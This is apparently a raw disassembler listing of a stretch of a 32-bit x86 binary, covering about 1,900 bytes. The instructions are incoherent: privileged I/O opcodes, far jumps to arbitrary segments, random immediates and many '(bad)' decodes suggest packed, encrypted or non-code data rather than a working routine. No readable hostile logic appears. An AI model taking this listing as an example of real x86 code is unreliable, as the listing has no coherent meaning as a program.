  419f91:	shl    DWORD PTR ds:0xcd3ef5ca,1
  419f97:	mov    eax,DWORD PTR [ecx-0x1e]
  419f9a:	lock pop ecx
  419f9c:	int3   
  419f9d:	int    0x2b
  419f9f:	es sahf 
  419fa1:	cwde   
  419fa2:	mov    ah,0xe9
  419fa4:	(bad)  
  419fa5:	sub    ah,BYTE PTR [bp+si]
  419fa8:	and    cl,BYTE PTR [ebx-0x53]
  419fab:	loopne 0x419fbf
  419fad:	xor    al,0xd
  419faf:	xchg   ecx,eax
  419fb0:	mov    DWORD PTR [edx-0x35],edx
  419fb3:	fnclex 
  419fb5:	ins    BYTE PTR es:[edi],dx
  419fb6:	jmp    0xa5b26bb4
  419fbb:	jmp    0xb07e:0xe1c630cf
  419fc2:	fst    QWORD PTR [ebx]
  419fc4:	je     0x419fb6
  419fc6:	inc    esp
  419fc7:	retf   0x5f6c
  419fca:	bound  ebp,QWORD PTR [esi+0x3e537531]
  419fd0:	cld    
  419fd1:	cmp    ah,0x5f
  419fd4:	dec    ecx
  419fd5:	sbb    dh,ch
  419fd7:	push   edx
  419fd8:	loope  0x41a01b
  419fda:	aas    
  419fdb:	cmp    ch,BYTE PTR [edi+0x1f]
  419fde:	inc    ebp
  419fdf:	push   0xaab8e247
  419fe4:	lods   al,BYTE PTR ds:[esi]
  419fe5:	mov    bl,cl
  419fe7:	or     eax,0x4a5327da
  419fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fed:	xchg   esi,eax
  419fee:	cmp    edi,DWORD PTR [esi]
  419ff0:	into   
  419ff1:	popa   
  419ff2:	fcmovne st,st(4)
  419ff4:	div    ebp
  419ff6:	cmc    
  419ff7:	dec    esi
  419ff8:	cmp    eax,DWORD PTR ds:[ecx-0x30]
  419ffc:	popa   
  419ffd:	and    BYTE PTR [ebp-0x7d],ch
  41a000:	cli    
  41a001:	dec    ecx
  41a002:	dec    ebp
  41a003:	aad    0x8c
  41a005:	js     0x41a016
  41a007:	pusha  
  41a008:	adc    ah,BYTE PTR ds:0x4ed67c68
  41a00e:	hlt    
  41a00f:	sub    ah,ch
  41a011:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a013:	jno    0x419fa1
  41a015:	dec    ecx
  41a016:	pop    edi
  41a017:	or     ah,BYTE PTR [ebx-0x7b27384d]
  41a01d:	and    BYTE PTR [ecx],ch
  41a01f:	and    BYTE PTR [ecx+0x68],al
  41a022:	sti    
  41a023:	daa    
  41a024:	xchg   ebx,eax
  41a025:	sub    bl,al
  41a027:	jne    0x41a03d
  41a029:	in     al,dx
  41a02a:	sbb    DWORD PTR [edx-0x6c09415a],ecx
  41a030:	loopne 0x41a019
  41a032:	add    BYTE PTR [esi-0x1f70d67a],0x51
  41a039:	int    0x66
  41a03b:	xchg   ebx,eax
  41a03c:	or     al,0x6f
  41a03e:	fwait
  41a03f:	push   edi
  41a040:	pop    esp
  41a041:	stos   BYTE PTR es:[edi],al
  41a042:	in     al,0xee
  41a044:	and    DWORD PTR [edx],ecx
  41a046:	popf   
  41a047:	out    dx,al
  41a048:	jecxz  0x41a039
  41a04a:	test   DWORD PTR [edx],ebp
  41a04c:	int3   
  41a04d:	pop    ds
  41a04e:	jmp    0x41a032
  41a050:	je     0x41a0c3
  41a052:	xor    eax,0x8703fe59
  41a057:	sub    dh,cl
  41a059:	or     DWORD PTR ds:0xc5c04776,ecx
  41a05f:	xor    BYTE PTR [edx+0x4b],bl
  41a062:	in     al,dx
  41a063:	scas   eax,DWORD PTR es:[edi]
  41a064:	pop    edx
  41a065:	xchg   edx,eax
  41a066:	add    dl,BYTE PTR ds:0x6fa92e63
  41a06c:	mov    WORD PTR [eax+0x56],fs
  41a06f:	aaa    
  41a070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a071:	cmp    DWORD PTR [ecx],edx
  41a073:	fld    QWORD PTR [eax+0x6bfc7919]
  41a079:	sub    edx,DWORD PTR [edi+0x6f1d444b]
  41a07f:	mov    esp,0x240179ab
  41a084:	push   0xffffffe2
  41a086:	int3   
  41a087:	and    ebx,DWORD PTR [eax]
  41a089:	dec    edx
  41a08a:	mov    al,0x49
  41a08c:	(bad)
  41a091:	mov    ds:0x218b7f7b,eax
  41a096:	xor    al,ah
  41a098:	cdq    
  41a099:	sub    cl,BYTE PTR [edx]
  41a09b:	xor    eax,0x972bd582
  41a0a0:	pop    esi
  41a0a1:	fcom   DWORD PTR ds:0x13789be
  41a0a7:	mov    dl,al
  41a0a9:	sub    eax,0xa91522b7
  41a0ae:	das    
  41a0af:	dec    esp
  41a0b0:	mov    ecx,0xc1e79aa7
  41a0b5:	cmp    ecx,DWORD PTR [edx]
  41a0b7:	test   DWORD PTR [esi-0x20],esi
  41a0ba:	cmp    DWORD PTR [ecx-0x34],esp
  41a0bd:	xor    BYTE PTR [edi],0x60
  41a0c0:	fidivr DWORD PTR [eiz*1+0x5cddfa72]
  41a0c7:	outs   dx,DWORD PTR ds:[esi]
  41a0c8:	arpl   WORD PTR [ecx],bp
  41a0ca:	loop   0x41a110
  41a0cc:	add    ebx,ebx
  41a0ce:	cli    
  41a0cf:	repnz loopne 0x41a0ba
  41a0d2:	ror    BYTE PTR [ecx+0x5ea5b282],0x17
  41a0d9:	daa    
  41a0da:	repz hlt 
  41a0dc:	and    al,0x98
  41a0de:	lods   eax,DWORD PTR fs:[esi]
  41a0e0:	les    esi,FWORD PTR [esi+0x40]
  41a0e3:	sahf   
  41a0e4:	push   ebp
  41a0e5:	lock loope 0x41a154
  41a0e8:	or     ah,al
  41a0ea:	add    bl,bh
  41a0ec:	out    0x85,eax
  41a0ee:	jae    0x41a0fa
  41a0f0:	stos   DWORD PTR es:[edi],eax
  41a0f1:	mov    dl,BYTE PTR [edx+esi*8]
  41a0f4:	cmp    DWORD PTR [esi-0x17ede455],ecx
  41a0fa:	jnp    0x41a0d5
  41a0fc:	inc    edx
  41a0fd:	mov    ah,0x9f
  41a0ff:	stos   BYTE PTR es:[edi],al
  41a100:	mov    DWORD PTR [eax-0x3f00a9a6],edx
  41a106:	fistp  WORD PTR es:[edx+0x528e8502]
  41a10d:	loopne 0x41a17b
  41a10f:	jge    0x41a0ad
  41a111:	hlt    
  41a112:	repnz (bad) 
  41a115:	das    
  41a116:	pushf  
  41a117:	aam    0xae
  41a119:	sti    
  41a11a:	sub    DWORD PTR [edx],esp
  41a11c:	test   DWORD PTR [edx-0x3e5f5634],esp
  41a122:	pop    ecx
  41a123:	inc    esi
  41a124:	cmp    eax,0xcd63465f
  41a129:	inc    ebx
  41a12a:	icebp  
  41a12b:	pushf  
  41a12c:	out    0x4f,al
  41a12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a12f:	ja     0x41a157
  41a131:	jno    0x41a125
  41a133:	or     BYTE PTR [eax+ecx*2+0x7abb70db],ch
  41a13a:	or     edi,esp
  41a13c:	loope  0x41a0fc
  41a13e:	pop    eax
  41a13f:	in     eax,0xb
  41a141:	add    BYTE PTR [esi+0x5028517e],al
  41a147:	shr    DWORD PTR ds:0x40514521,0x2
  41a14e:	jbe    0x41a180
  41a150:	pop    ss
  41a151:	adc    al,BYTE PTR [ebp+0xa]
  41a154:	out    0xd3,al
  41a156:	pushw  0x1a7f
  41a15a:	mov    al,0x35
  41a15c:	mov    edx,0x960843a7
  41a161:	fistp  DWORD PTR [ecx]
  41a163:	out    0xfa,eax
  41a165:	leave  
  41a166:	(bad)  
  41a167:	sti    
  41a168:	(bad)  [esi+0x79]
  41a16b:	mov    ds:0x355bd427,eax
  41a170:	lar    edi,WORD PTR [ebp+0x49fc3f05]
  41a177:	(bad)
  41a17a:	ins    DWORD PTR es:[edi],dx
  41a17b:	push   ss
  41a17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a17d:	dec    edx
  41a17e:	push   0x8829b0e0
  41a183:	push   0xcad78dd0
  41a188:	xor    bl,ah
  41a18a:	pop    es
  41a18b:	into   
  41a18c:	jo     0x41a17d
  41a18e:	jl     0x41a116
  41a190:	lods   eax,DWORD PTR ds:[esi]
  41a191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a192:	cmp    eax,DWORD PTR [edx+0x7a]
  41a195:	inc    ebx
  41a196:	sbb    DWORD PTR [ebp+0x74659a10],0xfbb51423
  41a1a0:	ror    BYTE PTR [esi-0x44],0x12
  41a1a4:	pop    edi
  41a1a5:	inc    eax
  41a1a6:	adc    BYTE PTR [ecx],dh
  41a1a8:	ss ja  0x41a205
  41a1ab:	jecxz  0x41a224
  41a1ad:	(bad)  
  41a1ae:	mov    edi,0xe5275aff
  41a1b3:	push   edx
  41a1b4:	push   ecx
  41a1b5:	mov    BYTE PTR [edi+0x50b31acf],dh
  41a1bb:	stos   DWORD PTR es:[edi],eax
  41a1bc:	jae    0x41a145
  41a1be:	jnp    0x41a1eb
  41a1c0:	xor    cl,BYTE PTR [eax+0x3975732a]
  41a1c6:	pop    ds
  41a1c7:	dec    ebp
  41a1c8:	add    dh,cl
  41a1ca:	xchg   ecx,eax
  41a1cb:	loop   0x41a1a6
  41a1cd:	out    0x2,eax
  41a1cf:	stc    
  41a1d0:	push   esi
  41a1d1:	ficomp DWORD PTR [edi]
  41a1d3:	pushf  
  41a1d4:	cli    
  41a1d5:	cs push ecx
  41a1d7:	push   ds
  41a1d8:	daa    
  41a1d9:	jmp    0x41a162
  41a1db:	jmp    0xdb39442d
  41a1e0:	mov    bh,0x34
  41a1e2:	or     DWORD PTR [ecx-0x2a63ca38],edx
  41a1e8:	pop    es
  41a1e9:	cmp    edi,ebp
  41a1eb:	mov    ah,0xf2
  41a1ed:	sub    DWORD PTR [edi-0x16],ebp
  41a1f0:	or     edi,DWORD PTR [eax+0x2eab58b4]
  41a1f6:	jle    0x41a229
  41a1f8:	ret    0xdda2
  41a1fb:	das    
  41a1fc:	xchg   ebp,eax
  41a1fd:	sbb    DWORD PTR [eax+0xbbad51c],esi
  41a203:	push   edi
  41a204:	ds fs inc esi
  41a207:	pop    esp
  41a208:	mov    cl,0x81
  41a20a:	dec    ebx
  41a20b:	jmp    FWORD PTR ds:0x29ed8122
  41a211:	out    0x20,al
  41a213:	and    al,0xcf
  41a215:	es dec ecx
  41a217:	(bad)  
  41a218:	xor    ebp,DWORD PTR [ecx+ecx*4+0x3b62eb29]
  41a21f:	and    eax,0x48cbe7ce
  41a224:	xlat   BYTE PTR ds:[ebx]
  41a225:	loop   0x41a1c0
  41a227:	and    edi,edx
  41a229:	rcr    ch,cl
  41a22b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a22c:	leave  
  41a22d:	(bad)  
  41a22e:	ror    BYTE PTR [ebx+0x1eaec2db],cl
  41a234:	dec    ecx
  41a235:	push   ebx
  41a236:	or     edi,DWORD PTR [ebx-0x593c496a]
  41a23c:	pop    es
  41a23d:	rol    BYTE PTR [ebp-0x7846d459],cl
  41a243:	inc    esi
  41a244:	imul   ebx,DWORD PTR [edx+0x5e],0xd1b26749
  41a24b:	jb     0x41a29c
  41a24d:	adc    BYTE PTR [eax+0x2ad5bae0],dh
  41a253:	push   es
  41a254:	imul   ecx,DWORD PTR [eax-0x3b],0x72f7bd72
  41a25b:	ficom  WORD PTR [edi+0x2c]
  41a25e:	jno    0x41a2ad
  41a260:	jnp    0x41a24f
  41a262:	test   DWORD PTR [ebx+0x58694d05],esi
  41a268:	add    esi,DWORD PTR [edi+0x49]
  41a26b:	pop    ebp
  41a26c:	or     al,0x8b
  41a26e:	psubb  mm7,mm0
  41a271:	cmp    al,0xe0
  41a273:	cwde   
  41a274:	sahf   
  41a275:	pop    esi
  41a276:	(bad)  
  41a277:	das    
  41a278:	and    dh,cl
  41a27a:	dec    ebx
  41a27b:	sbb    ebp,eax
  41a27d:	pop    es
  41a27e:	shl    BYTE PTR [ebx],0x14
  41a281:	rcl    BYTE PTR [edx+0x678a7723],0xb4
  41a288:	scas   al,BYTE PTR es:[edi]
  41a289:	test   eax,0xca7ee0ec
  41a28e:	dec    ebp
  41a28f:	ret    
  41a290:	push   0xfffffffc
  41a292:	xchg   dh,al
  41a294:	clc    
  41a295:	rcr    DWORD PTR [esi+0x40],0x66
  41a299:	adc    BYTE PTR [ebx+0x4e1d0cfc],bh
  41a29f:	mov    eax,0x899bd298
  41a2a4:	jl     0x41a24c
  41a2a6:	xor    al,0x87
  41a2a8:	jnp    0x41a233
  41a2aa:	popw   ds
  41a2ac:	and    DWORD PTR [eax],esi
  41a2ae:	adc    DWORD PTR [ecx-0x50],ebp
  41a2b1:	jl     0x41a255
  41a2b3:	dec    eax
  41a2b4:	sbb    DWORD PTR ds:0xa2d7e29a,esi
  41a2ba:	popa   
  41a2bb:	mov    BYTE PTR [eax-0x6],dh
  41a2be:	icebp  
  41a2bf:	pusha  
  41a2c0:	cdq    
  41a2c1:	mov    BYTE PTR [ebx],al
  41a2c3:	mov    WORD PTR [eax+edi*2-0x74],es
  41a2c7:	loope  0x41a345
  41a2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ca:	or     cl,0x2
  41a2cd:	stc    
  41a2ce:	scas   eax,DWORD PTR es:[edi]
  41a2cf:	int    0xab
  41a2d1:	and    al,BYTE PTR ds:0xf757ab0d
  41a2d7:	xchg   esp,eax
  41a2d8:	jb     0x41a347
  41a2da:	addr16 sub al,0x77
  41a2dd:	sbb    DWORD PTR [esi],ebx
  41a2df:	xor    eax,0x4021ce2
  41a2e4:	push   es
  41a2e5:	call   0x21cd:0x98b8cb74
  41a2ec:	lea    ebp,[ecx]
  41a2ee:	mov    dl,0xa4
  41a2f0:	test   al,0x3f
  41a2f2:	push   0xffffff88
  41a2f4:	aas    
  41a2f5:	sahf   
  41a2f6:	or     DWORD PTR [ecx+0x37],edx
  41a2f9:	fucomi st,st(5)
  41a2fb:	fwait
  41a2fc:	cmp    eax,0xc86f3bf4
  41a301:	pop    ss
  41a302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a303:	dec    esi
  41a304:	out    0x87,al
  41a306:	xor    al,0x7
  41a308:	pop    eax
  41a309:	xor    al,0x2f
  41a30b:	cmp    eax,0xe3b67c2
  41a310:	and    eax,0xe76596e2
  41a315:	mov    WORD PTR [ebp-0x40],?
  41a318:	pop    esi
  41a319:	pop    edi
  41a31a:	neg    BYTE PTR [ecx+0x16db81b7]
  41a320:	rol    DWORD PTR ds:0x8dbd9f4e,1
  41a326:	cmp    al,0xd1
  41a328:	jbe    0x41a2ce
  41a32a:	inc    eax
  41a32b:	dec    edx
  41a32c:	call   0x140d5b71
  41a331:	loop   0x41a380
  41a333:	std    
  41a334:	lea    ecx,[eax+0x1a]
  41a337:	mov    BYTE PTR [ebp-0x2dac2778],0xe8
  41a33e:	inc    ebx
  41a33f:	repnz push edi
  41a341:	push   DWORD PTR [eax+0x290cc9c2]
  41a347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a348:	gs ss pop ss
  41a34b:	mov    ch,0x66
  41a34d:	ja     0x41a333
  41a34f:	xor    ch,al
  41a351:	scas   al,BYTE PTR es:[di]
  41a353:	and    DWORD PTR ss:[eax+0x2d],ebp
  41a357:	in     eax,0x13
  41a359:	inc    esi
  41a35a:	sub    esi,esi
  41a35c:	(bad)  
  41a35d:	dec    esi
  41a35e:	ins    BYTE PTR es:[di],dx
  41a360:	clc    
  41a361:	and    al,BYTE PTR [ebx]
  41a363:	mov    eax,ds:0x448de89d
  41a368:	add    eax,0x2c54c7fc
  41a36d:	in     al,0x4d
  41a36f:	pop    es
  41a370:	or     cl,BYTE PTR [esi+edi*8]
  41a373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a374:	adc    eax,0x2ae31fe1
  41a379:	mov    al,ds:0xb0709b02
  41a37e:	rcl    DWORD PTR [esp+edi*1-0x21],cl
  41a382:	cwde   
  41a383:	pcmpeqb mm5,QWORD PTR [ebx+0x1d]
  41a387:	xor    BYTE PTR [esi-0x4f67de1a],al
  41a38d:	sbb    esi,esp
  41a38f:	and    eax,ebp
  41a391:	enter  0x9601,0x5a
  41a395:	jmp    0xac65a95e
  41a39a:	jge    0x41a3f9
  41a39c:	es sar bh,cl
  41a39f:	(bad)  
  41a3a1:	cmc    
  41a3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3a3:	sub    DWORD PTR [ecx],edx
  41a3a5:	mov    al,ds:0x2afa574f
  41a3aa:	sahf   
  41a3ab:	sar    DWORD PTR [edx+0x6d],0xc3
  41a3af:	mov    ebx,0x2a3a7be
  41a3b4:	(bad)  
  41a3b6:	mov    eax,0x4f53daf3
  41a3bb:	inc    edx
  41a3bc:	xor    ebx,ebx
  41a3be:	jecxz  0x41a354
  41a3c0:	jp     0x41a408
  41a3c2:	int    0x29
  41a3c4:	jl     0x41a37d
  41a3c6:	mov    DWORD PTR [ebx],0x89a97747
  41a3cc:	mov    dh,0x4
  41a3ce:	mov    cl,0x37
  41a3d0:	(bad)  
  41a3d1:	mov    dl,0xb1
  41a3d3:	test   eax,0x8c182a3b
  41a3d8:	ss jl  0x41a448
  41a3db:	jbe    0x41a36e
  41a3dd:	cmp    esp,DWORD PTR ds:0x1bca3aca
  41a3e3:	gs mov edi,0xfb94cbb3
  41a3e9:	jmp    0xe6177cc1
  41a3ee:	loopne 0x41a3bc
  41a3f0:	retf   0x1e36
  41a3f3:	pop    esp
  41a3f4:	push   ebx
  41a3f5:	sbb    cl,BYTE PTR [ecx+eiz*1-0x41077b95]
  41a3fc:	adc    BYTE PTR [ebp+edx*4-0x69],bh
  41a400:	jle    0x41a46c
  41a402:	sub    al,0x14
  41a404:	fld    DWORD PTR [ebp-0x57]
  41a407:	sub    BYTE PTR [edx-0x78],0xee
  41a40b:	mov    bh,0x8a
  41a40d:	nop
  41a40e:	jb     0x41a47c
  41a410:	jmp    0xb3c0:0xc96b1682
  41a417:	xchg   ecx,eax
  41a418:	mov    ebp,0xa83f55fe
  41a41d:	push   ecx
  41a41e:	mov    eax,0x8498769b
  41a423:	sti    
  41a424:	jb     0x41a457
  41a426:	mov    ds:0xc6c22377,al
  41a42b:	ins    DWORD PTR es:[edi],dx
  41a42c:	adc    BYTE PTR ds:0xe0edc476,bh
  41a432:	sub    al,0xe9
  41a434:	mov    bl,0xe2
  41a436:	push   esi
  41a437:	mov    ds:0xb82cfe63,eax
  41a43c:	aas    
  41a43d:	aas    
  41a43e:	jo     0x41a42c
  41a440:	sub    esi,esi
  41a442:	push   edx
  41a443:	retf   
  41a444:	mov    ch,0x2
  41a446:	loopne 0x41a47a
  41a448:	cmp    eax,0x2e62e762
  41a44d:	in     eax,0x2a
  41a44f:	jl     0x41a427
  41a451:	fidivr DWORD PTR [eax-0x74f0373d]
  41a457:	sbb    eax,0xf2b249c8
  41a45c:	test   al,0xc7
  41a45e:	in     al,dx
  41a45f:	cwde   
  41a460:	lods   al,BYTE PTR ds:[esi]
  41a461:	xchg   esi,eax
  41a462:	test   al,0xd9
  41a464:	push   ecx
  41a465:	pop    esi
  41a466:	xor    eax,0x5bbc6886
  41a46b:	icebp  
  41a46c:	cmp    al,0x83
  41a46e:	out    dx,eax
  41a46f:	mov    eax,ds:0x3cfb48c3
  41a474:	adc    al,0x27
  41a476:	add    DWORD PTR [eax+0x33],esp
  41a479:	daa    
  41a47a:	imul   DWORD PTR [esi+eax*4+0x6b]
  41a47e:	jp     0x41a443
  41a480:	lds    ebp,FWORD PTR [ebx+0x75]
  41a483:	cwde   
  41a484:	jnp    0x41a4cc
  41a486:	imul   esi,DWORD PTR [edi+0x70715fa0],0x30
  41a48d:	xlat   BYTE PTR ds:[ebx]
  41a48e:	addr16 inc esp
  41a490:	out    0xbb,al
  41a492:	shl    ebx,1
  41a494:	mov    bh,0x17
  41a496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a497:	mov    esp,DWORD PTR ds:0xd5345963
  41a49d:	iret   
  41a49e:	mov    eax,ds:0x49b7f99
  41a4a3:	retf   
  41a4a4:	push   eax
  41a4a5:	cmp    DWORD PTR [ebp+0x6c],ebx
  41a4a8:	inc    edx
  41a4a9:	imul   esi,DWORD PTR [ebx+edx*4],0x5c
  41a4ad:	push   0x6e
  41a4af:	pushf  
  41a4b0:	and    dl,BYTE PTR [esp+ebp*1-0x2ce959d5]
  41a4b7:	dec    eax
  41a4b8:	push   ds
  41a4b9:	or     ch,bl
  41a4bb:	adc    edx,ebp
  41a4bd:	jno    0x41a455
  41a4bf:	stos   BYTE PTR es:[edi],al
  41a4c0:	imul   esp,DWORD PTR [edi],0xa2b90511
  41a4c6:	xchg   ebp,eax
  41a4c7:	xchg   BYTE PTR ds:0xc77c7e26,dl
  41a4cd:	pop    es
  41a4ce:	lock stos BYTE PTR es:[edi],al
  41a4d0:	mov    ds:0xdcdc71ee,eax
  41a4d5:	sbb    BYTE PTR [edi+edi*2+0x309cc600],0x50
  41a4dd:	jg     0x41a4c2
  41a4df:	test   DWORD PTR [eax],edi
  41a4e1:	pop    ecx
  41a4e2:	scas   al,BYTE PTR es:[edi]
  41a4e3:	scas   al,BYTE PTR es:[edi]
  41a4e4:	gs call 0x1820:0x3ea2dee
  41a4ec:	sub    DWORD PTR [ecx],ebp
  41a4ee:	mov    DWORD PTR [edi+0x4e],esi
  41a4f1:	call   0x4038:0xb3d3b6c8
  41a4f8:	fidiv  DWORD PTR [edi]
  41a4fa:	loope  0x41a4a1
  41a4fc:	inc    eax
  41a4fd:	test   DWORD PTR [esp+edi*2-0x7646315b],esi
  41a504:	mov    al,ds:0xc41ff38f
  41a509:	pushf  
  41a50a:	std    
  41a50b:	(bad)  
  41a50c:	jne    0x41a4fa
  41a50e:	into   
  41a50f:	imul   edi,DWORD PTR [edx+0x4aa7077a],0x11154cbd
  41a519:	cli    
  41a51a:	xchg   esi,eax
  41a51b:	dec    ecx
  41a51c:	lods   eax,DWORD PTR ds:[esi]
  41a51d:	xor    DWORD PTR [edx-0x77],edx
  41a520:	and    al,BYTE PTR [eax-0x1f]
  41a523:	lahf   
  41a524:	sub    BYTE PTR [edx+0x74a9b93b],ch
  41a52a:	and    edi,eax
  41a52c:	adc    ecx,DWORD PTR [ebp-0x49bd9bcf]
  41a532:	mov    edi,0x49bf48ad
  41a537:	out    0xfc,eax
  41a539:	test   al,0x55
  41a53b:	imul   esp,DWORD PTR [edx+eax*2+0x5],0xffffff95
  41a540:	loope  0x41a4f4
  41a542:	dec    ebx
  41a543:	or     al,0x41
  41a545:	dec    ebx
  41a546:	inc    ebp
  41a547:	lds    edi,FWORD PTR [ecx+0x4f]
  41a54a:	sbb    dl,BYTE PTR [ebx]
  41a54c:	int3   
  41a54d:	call   0x64277fef
  41a552:	mov    edx,0x11c2f5e4
  41a557:	(bad)  
  41a558:	pushf  
  41a559:	loope  0x41a536
  41a55b:	cmp    eax,0x1f688b48
  41a560:	push   ebx
  41a561:	(bad)  
  41a562:	xchg   ebp,eax
  41a563:	mov    bl,0x80
  41a565:	or     al,0x68
  41a567:	outs   dx,BYTE PTR ds:[esi]
  41a568:	or     esp,eax
  41a56a:	jbe    0x41a540
  41a56c:	cld    
  41a56d:	(bad)  
  41a56e:	out    dx,al
  41a56f:	daa    
  41a570:	es out 0x5f,al
  41a573:	nop
  41a574:	pop    edx
  41a575:	ds out 0xa,eax
  41a578:	jmp    FWORD PTR [eax+0x6]
  41a57b:	pop    esi
  41a57c:	int3   
  41a57d:	dec    edx
  41a57e:	jnp    0x41a595
  41a580:	lods   al,BYTE PTR ds:[esi]
  41a581:	idiv   BYTE PTR [ecx+ecx*1-0x6b]
  41a585:	inc    edi
  41a586:	mov    eax,0x6ea60f66
  41a58b:	call   0x6d80:0x58acf585
  41a592:	pushf  
  41a593:	not    DWORD PTR [edi]
  41a595:	test   BYTE PTR [ebx-0x1a92e040],ah
  41a59b:	and    BYTE PTR [esi],dh
  41a59d:	add    esi,DWORD PTR [eax]
  41a59f:	lods   eax,DWORD PTR ds:[esi]
  41a5a0:	push   ds
  41a5a1:	dec    edx
  41a5a2:	jmp    0x41a528
  41a5a4:	jne    0x41a5a4
  41a5a6:	shl    DWORD PTR [eax+0x4f80fc62],1
  41a5ac:	inc    edi
  41a5ad:	aam    0x6d
  41a5af:	je     0x41a565
  41a5b1:	inc    ebx
  41a5b2:	fmul   DWORD PTR [ebp-0x65107fde]
  41a5b8:	add    edi,esi
  41a5ba:	ins    BYTE PTR es:[edi],dx
  41a5bb:	jb     0x41a563
  41a5bd:	fwait
  41a5be:	(bad)  
  41a5bf:	retf   0xe0d7
  41a5c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c3:	pop    es
  41a5c4:	pop    es
  41a5c5:	retf   
  41a5c6:	and    BYTE PTR [esi-0x36],ah
  41a5c9:	or     cl,ch
  41a5cb:	inc    eax
  41a5cc:	stos   BYTE PTR es:[edi],al
  41a5cd:	jecxz  0x41a5cb
  41a5cf:	pop    edi
  41a5d0:	mov    es,WORD PTR [edx+0x36f87a30]
  41a5d6:	inc    ecx
  41a5d7:	and    eax,DWORD PTR [edi-0x6b5c1fa9]
  41a5dd:	add    edi,DWORD PTR [esi+0x3cbac638]
  41a5e3:	adc    eax,0xb04741b3
  41a5e8:	cmp    DWORD PTR [ecx],0x50503d2a
  41a5ee:	dec    esp
  41a5ef:	mov    bl,0x6e
  41a5f1:	push   cs
  41a5f2:	popa   
  41a5f3:	adc    dh,BYTE PTR [ebx]
  41a5f5:	sti    
  41a5f6:	lods   al,BYTE PTR ds:[esi]
  41a5f7:	bound  ebx,QWORD PTR [eax-0x209d7aba]
  41a5fd:	cmp    BYTE PTR [ebx-0x2f],bl
  41a600:	or     esi,DWORD PTR [edx]
  41a602:	push   esp
  41a603:	pop    ebx
  41a604:	mov    dl,0xc6
  41a606:	adc    eax,DWORD PTR [ecx]
  41a608:	cmpxchg esi,edi
  41a60b:	mov    ebp,0xf8c04bf9
  41a610:	mov    ah,0x3d
  41a612:	iret   
  41a613:	inc    edi
  41a614:	mov    bl,0x2c
  41a616:	icebp  
  41a617:	mov    esp,0xa2768fd4
  41a61c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a61d:	mov    esp,0xd4d9e63f
  41a622:	repz and BYTE PTR [esi+0x5d84ac41],0x9e
  41a62a:	aaa    
  41a62b:	push   ebp
  41a62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a62d:	adc    eax,DWORD PTR [esi+0x529dcbdc]
  41a633:	stos   DWORD PTR es:[edi],eax
  41a634:	pop    esi
  41a635:	ins    DWORD PTR es:[edi],dx
  41a636:	add    al,cl
  41a638:	test   BYTE PTR [ebx-0x72],ah
  41a63b:	jecxz  0x41a5e9
  41a63d:	call   0x261dff6e
  41a642:	pop    esi
  41a643:	(bad)  
  41a646:	fwait
  41a647:	add    BYTE PTR [ebx-0x4508c0cf],0x40
  41a64e:	cmc    
  41a64f:	inc    ecx
  41a650:	paddq  mm5,QWORD PTR [esi-0x6c72e9]
  41a657:	dec    edx
  41a658:	cmp    edi,edi
  41a65a:	test   BYTE PTR ds:0x1889a0bd,cl
  41a660:	cmp    BYTE PTR [eax],ch
  41a662:	pushf  
  41a663:	das    
  41a664:	aaa    
  41a665:	mov    ebx,0x83dc8776
  41a66a:	sub    eax,0xcb9d1e9c
  41a66f:	rcr    DWORD PTR [eax*1+0x66efd44e],0xdc
  41a677:	adc    ah,ch
  41a679:	cld    
  41a67a:	sbb    BYTE PTR [edi+0x7e],bh
  41a67d:	pop    es
  41a67e:	div    BYTE PTR [eax]
  41a680:	stc    
  41a681:	jnp    0x41a655
  41a683:	mov    cl,0xb
  41a685:	inc    esp
  41a686:	aam    0x30
  41a688:	cs adc eax,0x4e1fc379
  41a68e:	outs   dx,BYTE PTR ds:[esi]
  41a68f:	into   
  41a690:	in     al,dx
  41a691:	les    ebx,FWORD PTR [eax-0x2e]
  41a694:	adc    ebp,0xaee9b436
  41a69a:	rcl    DWORD PTR [edi+0x2714a7c6],1
  41a6a0:	pop    ebx
  41a6a1:	int3   
  41a6a2:	xchg   edi,eax
  41a6a3:	and    dl,ch
  41a6a5:	xor    eax,0x304b33a5
  41a6aa:	xchg   BYTE PTR [esi+eax*1+0x2a5ac46c],al
  41a6b1:	or     eax,0xc39a35f0
  41a6b6:	push   edx
  41a6b7:	arpl   WORD PTR [ebx+0x16dbca05],cx
  41a6bd:	inc    ebp
  41a6be:	sub    al,BYTE PTR [ecx]
  41a6c0:	jae    0x41a6cc
  41a6c2:	mov    ds:0xd9d9372e,eax
  41a6c7:	cmp    DWORD PTR [eax-0x25],esi
  41a6ca:	sbb    DWORD PTR [esi],esp
  41a6cc:	mov    esp,0x384444ea
  41a6d1:	push   ss
  41a6d2:	push   ecx
  41a6d3:	fwait
  41a6d4:	dec    ebx
  41a6d5:	mov    ah,0xdd
  41a6d7:	popf   
  41a6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d9:	dec    edi
  41a6da:	and    DWORD PTR [edi],0x42795398
  41a6e0:	ret    0xac81
  41a6e3:	or     ah,bl
  41a6e5:	xor    ah,BYTE PTR [edx]
  41a6e7:	push   es
  41a6e8:	inc    edx
  41a6e9:	sbb    eax,0x91c3b33f
  41a6ee:	add    BYTE PTR [ebx+0x20],ah
  41a6f1:	call   0xebd7aeaa
  41a6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6f7:	push   ebx
  41a6f8:	pop    edi
  41a6f9:	mov    edx,0xc93027ee
  41a6fe:	pop    ebp
  41a6ff:	jle    0x41a689
  41a701:	inc    ebp
  41a702:	(bad)  
  41a703:	int    0x9d
